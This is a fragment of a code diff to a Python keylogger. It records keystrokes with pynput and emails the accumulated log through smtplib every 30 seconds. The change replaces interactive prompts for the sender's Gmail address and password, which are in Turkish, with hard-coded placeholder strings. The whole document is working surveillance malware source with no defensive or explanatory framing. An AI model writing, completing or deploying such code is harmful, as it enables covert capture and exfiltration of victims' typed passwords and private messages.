@@ -2,8 +2,6 @@ from pynput import keyboard
 import smtplib
 import threading
 import optparse
-gmail=input("Gmailini Gir: ")
-password=input("Sifreni Gir: ")
 log=""
 def callback(key):
     global log
@@ -23,8 +21,8 @@ def email_send(gmail,pw,message):
     emailsend.sendmail(gmail,gmail,message)
     emailsend.quit()
 def thread():
-    global log,gmail,password
-    email_send(gmail,password,log.encode("utf-8"))
+    global log
+    email_send("gmail","password",log.encode("utf-8"))
     log=""
     timer=threading.Timer(30,thread)
     timer.start()
